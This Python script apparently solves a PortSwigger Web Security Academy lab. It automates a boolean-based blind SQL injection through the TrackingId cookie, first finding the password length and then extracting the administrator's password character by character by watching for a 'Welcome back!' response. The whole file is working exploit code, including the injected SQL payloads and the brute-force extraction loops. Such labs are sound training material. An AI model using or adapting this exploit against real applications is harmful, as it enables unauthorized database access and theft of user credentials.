import os
import requests
import string

def clear_screen():
    currentOS = os.name

    if currentOS == "nt":
        os.system('cls')
    elif currentOS == "posix":
        os.system('clear')

def get_pw_length():
    # TLDR: To determine pw length, program will loop from 1-20.
    for i in range(1, 21):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
            'Cookie' : f"TrackingId={trackingID}' and (select length(password) from users limit 1)={i}--; session={sessionID}"
        }

        res = requests.get(url, headers=headers)
        if successString in res.text:
            print(f"[+] Password Length : {i}")
            return(i)

def get_pw():
    # Generate chars + numbers
    charsets = '0123456789' + string.ascii_lowercase 

    adminPassword = ''
    print('[+] Guessing admin\'s password:')

    # Outer loop - Encompass the password length
    for i in range(1, pw_len +1, 1):
        # Inner loop - Loop between individual characters from the charset
        for c in charsets:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
                'Cookie' : f"TrackingId={trackingID}' and (select substring(password, {i}, 1) from users where username='administrator')='{c}'--; session={sessionID}"
            }

            res = requests.get(url, headers=headers)
            if successString in res.text:
                adminPassword += c
                print(f"[+] Password: {adminPassword}", end='\r', flush=False)
                break # Once password is found on index i, breaks out of for loop and go to the next index
    
    print(f"[+] Password: {adminPassword}")

if __name__ == "__main__":
    clear_screen()

    host = '.web-security-academy.net'  # Insert burp academy url here
    url = f'https://{host}/filter?category=Accessories'
    trackingID = '' # Insert tracking id here
    sessionID = '' # Insert session id here
    successString = 'Welcome back!'
    
    pw_len = get_pw_length()
    get_pw()